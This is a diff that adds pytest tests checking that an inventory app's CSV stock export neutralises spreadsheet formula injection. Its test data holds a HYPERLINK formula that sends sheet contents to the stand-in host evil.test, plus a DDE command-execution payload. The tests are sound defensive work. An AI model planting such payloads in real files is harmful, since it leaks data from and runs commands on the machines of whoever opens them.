@@ -259,3 +259,75 @@ def test_export_is_empty_but_valid_with_no_stock(client, manager):
     response = client.get("/api/exports/stock-position/")
     body = b"".join(response.streaming_content).decode("utf-8")
     assert body.strip() == "sku,name,category,location,location_name,on_hand"
+
+
+# --- CSV injection --------------------------------------------------------
+
+def test_export_neutralises_a_formula_in_an_item_name(
+    client, manager, item, warehouse
+):
+    """Item names are free text typed by a manager, and the export is opened
+    in Excel. A name beginning with "=" is a formula there, not a label.
+
+    HYPERLINK is the harmless-looking version; the same mechanism reaches
+    remote URLs with the sheet's contents attached.
+    """
+    item.name = '=HYPERLINK("http://evil.test?d="&A1,"Click")'
+    item.save(update_fields=["name"])
+    ss.record_receipt(actor=manager, item=item, location=warehouse, quantity=5)
+
+    client.force_login(manager)
+    body = b"".join(
+        client.get("/api/exports/stock-position/").streaming_content
+    ).decode("utf-8")
+
+    row = next(r for r in csv.reader(io.StringIO(body)) if r[0] == item.sku)
+    assert row[1].startswith("'=")
+    # The value is preserved, only prefixed. An export that silently altered
+    # the data would stop being a faithful record.
+    assert row[1] == "'" + item.name
+
+
+@pytest.mark.parametrize("prefix", ["=", "+", "-", "@", "\t", "\r"])
+def test_every_formula_prefix_is_covered(client, manager, item, warehouse, prefix):
+    """Tab and carriage return included: Excel strips leading whitespace
+    before deciding whether a cell is a formula, so they are not an escape."""
+    item.name = prefix + "cmd|' /c calc'!A1"
+    item.save(update_fields=["name"])
+    ss.record_receipt(actor=manager, item=item, location=warehouse, quantity=1)
+
+    client.force_login(manager)
+    body = b"".join(
+        client.get("/api/exports/stock-position/").streaming_content
+    ).decode("utf-8")
+
+    row = next(r for r in csv.reader(io.StringIO(body)) if r[0] == item.sku)
+    assert row[1].startswith("'")
+
+
+def test_ordinary_names_are_left_alone(client, manager, item, warehouse):
+    """The guard must not put an apostrophe in front of every cell. A file
+    full of 'Hex bolt M8 would be worse than the problem it solves."""
+    ss.record_receipt(actor=manager, item=item, location=warehouse, quantity=5)
+
+    client.force_login(manager)
+    body = b"".join(
+        client.get("/api/exports/stock-position/").streaming_content
+    ).decode("utf-8")
+
+    row = next(r for r in csv.reader(io.StringIO(body)) if r[0] == item.sku)
+    assert row[1] == "Hex bolt M8"
+    assert row[3] == warehouse.code
+
+
+def test_the_prefix_is_added_on_export_not_stored(client, manager, category):
+    """Importing "=1+1" stores that string unchanged; only the export prefixes
+    it. If the apostrophe reached the database, two round trips would
+    accumulate them and the item would slowly rename itself.
+    """
+    client.force_login(manager)
+    client.post(
+        "/api/imports/items/",
+        {"file": upload(ITEM_HEADER + "X-9,=1+1," + category.name + ",EA,5\n")},
+    )
+    assert Item.objects.get(sku="X-9").name == "=1+1"
